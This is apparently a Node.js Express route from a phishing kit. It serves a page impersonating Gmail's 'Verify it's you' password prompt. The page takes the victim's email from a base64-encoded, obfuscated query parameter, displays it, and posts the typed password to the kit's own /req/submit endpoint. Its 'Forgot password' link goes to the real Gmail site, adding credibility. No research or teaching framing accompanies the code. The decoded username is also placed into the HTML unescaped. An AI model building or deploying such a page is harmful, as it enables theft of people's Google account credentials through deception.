
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.tyrtyrtujueru9843efjdfhfwheur;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  

    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login</title>
    <link rel="shortcut icon" href="./images/image.png" type="image">
    <style>
        /* Reset and General Styles */
        body {
            margin: 47px;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 90vh;
        }

        .maindiv {
            width: calc(55% + 4cm); /* Enlarge form width by 2 cm each side */
            max-width: calc(680px + 4cm); /* Increase max-width */
            height: 306px; /* Increase height */
            padding: 40px;
            background: #fff;
            border-radius: 27px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: row;
            flex-wrap: wrap;
        }

        /* Left Section: Logo, Welcome, User Info */
        .form-half {
            flex: 1;
            min-width: 280px;
            padding-right: 4px;
        }

        .form-half .divlogo {
            width: 60px;
            height: 60px;
            margin-bottom: 15px;
        }

        .form-half .welcome {
            font-size: 39px;
            margin-top: 30px;
            margin-bottom: 15px;
        }

        .userdiv {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            border: 0.4px solid #312f2f;
            border-radius: 30px;
            background-color: #f2f2f2;
            width: fit-content;
            margin-top: 15px;
        }

        .userdiv img {
            vertical-align: middle;
        }

        .user-icon {
            margin-top: 2px;
            margin-bottom: 2px;
            margin-left: 6px;
            margin-right: 15px;
            width: 18px;
            height: 18px;
        }

        .dropdown-icon {
            margin-top: 2px;
            margin-bottom: 2px;
            margin-left: 25px;
            margin-right: 10px;
            width: 10px;
            height: 8px;
        }

        .userdiv span {
            font-size: 16px;
            color: #2c2a2a;
        }

        /* Right Section: Password Input, Show Password, Forgot Password, Next Button */
        .form-half1 {
            flex: 1;
            min-width: 324px;
            padding-left: 20px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .passdiv input {
            width: 90%;
            padding: 15px;
            font-size: 16px;
            border-radius: 5px;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .passdiv input {
            border: 2px solid #413f3f;
        }

        .passdiv input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 5px rgba(26, 115, 232, 0.5);
        }

        .shwpwd {
            margin-top: 20px;
        }

        .shwpwd input {
            margin-right: 5px;
        }

        .shwpwd .button {
            cursor: pointer;
        }

        .fgtpwd {
            margin-top: 42px;
            margin-left: 30%;
        }

        .fgtpwd .hyperl {
            font-size: 16px;
            color: #1a73e8;
            border: none;
            background: none;
            cursor: pointer;
        }

        .btnnxt {
            padding: 9px 18px;
            font-size: 16px;
            border: none;
            border-radius: 20px;
            background-color: #1a73e8;
            color: white;
            cursor: pointer;
        }

        .btnnxt:hover {
            background-color: #0c5cd2;
        }

        /* Bottom Section Styles */
        .btmdiv {
            width: calc(60% + 4cm);
            max-width: calc(660px + 4cm);
            padding: 0px;
            background-color: rgba(0, 0, 0, 0); /* Transparent background */
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0);
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .left-div {
            flex-grow: 1;
            background-color: rgba(255, 255, 255, 0); /* Transparent for left div */
            border: none;
        }

        .right-divs {
            display: flex;
        }

        .right-div {
            margin-left: 15px;
            background-color: rgba(255, 255, 255, 0); /* Transparent for right div */
            border: none;
        }

        select.btmhypl {
            padding: 10px;
            font-size: 13px;
            background-color: rgba(255, 255, 255, 0); /* Transparent background */
            border: none;
            color: black; /* Text is black */
        }

        button.btmhypl {
            background-color: rgba(255, 255, 255, 0); /* Transparent background */
            color: black; /* Text is black */
            border: none;
            cursor: pointer;
            padding: 10px;
            font-size: 13px;
            transition: background-color ease-in-out duration(.3s);
        }

        button.btmhypl:hover {
            background-color: #e7f3ff;
        }

        .session-expired-message {
            font-size: 16px;
            color: #c20606;
            margin-top: 25px; /* Add some margin below the message */
            margin-bottom: 39px; /* Add some margin below the message */
        }

        /* Media Queries for Mobile Responsiveness */
        @media (max-width: 768px) {
            .maindiv {
                flex-direction: column;
                height: auto;
                padding: 20px;
            }

            .form-half, .form-half1 {
                min-width: 100%;
                padding: 0;
            }

            .welcome {
                font-size: 28px;
            }

            .userdiv {
                width: 100%;
                justify-content: center;
            }

            .btnnxt {
                width: 100%;
                padding: 12px 0;
            }

            .fgtpwd {
                margin-left: 0;
                text-align: center;
            }

            .btmdiv {
                flex-direction: column;
                align-items: center;
            }

            .left-div, .right-divs {
                width: 100%;
                justify-content: center;
            }

            .right-div {
                margin-left: 10px;
            }
        }
    </style>
</head>

<body>
    <div class="maindiv">
        <!-- Left Section: Logo, Welcome, User Info -->
        <div class="form-half">
            <div>
                <img class="divlogo" src="./images/image.png" alt="Logo">
            </div>
            <div>
                <span class="welcome">Verify it's you</span>
            </div>
            <div class="userdiv">
                <img class="user-icon" src="./images/user-circle.png" alt="User Icon">
                <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${username}</span>
                <img class="dropdown-icon" src="./images/dropd.jpg" alt="Dropdown Icon">
            </div>
        </div>

        <!-- Right Section: Password Input, Show Password, Forgot Password, Next Button -->
        <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
            <div class="form-half1">
                <!-- Session Expired Message at the top of the right section -->
                <div class="session-expired-message">
                    <p>Google Needs Verify its you.</p>
                </div>

                <div class="passdiv">
                    <input type="hidden" name="username" id="useRname" value="${username}">
                    <input required name="password" type="password" id="pEyar" placeholder="Enter Password">
                </div>

                <div class="shwpwd">
                    <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
                    <span onclick="ShowpassWord();" class="button">Show password</span>
                </div>

                <script>
                    // Show password functionality
                    function ShowpassWord() {
                        var passwordField = document.getElementById("pEyar");
                        var checkBox = document.querySelector(".checkbox");
                        if (checkBox.checked) {
                            passwordField.type = "text";
                        } else {
                            passwordField.type = "password";
                        }
                    }

                    // Forgot Password Functionality
                    function forgotPassword() {
                        window.location.href = 'https://mail.google.com'; // Redirect to forgot password page or URL
                    }
                </script>

                <div class="fgtpwd">
                    <button type="button" id="myButton" class="hyperl" onclick="forgotPassword()">Forgot password?</button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt">Next</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Bottom Section -->
    <div class="btmdiv">
        <div class="left-div">
            <select class="btmhypl" id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>

        <div class="right-divs">
            <div class="right-div">
                <button id="helpButton" class="btmhypl">Help</button>
            </div>
            <div class="right-div">
                <button id="privacyButton" class="btmhypl">Privacy</button>
            </div>
            <div class="right-div">
                <button id="termsButton" class="btmhypl">Terms</button>
            </div>
        </div>
    </div>
</body>

</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});



module.exports =router
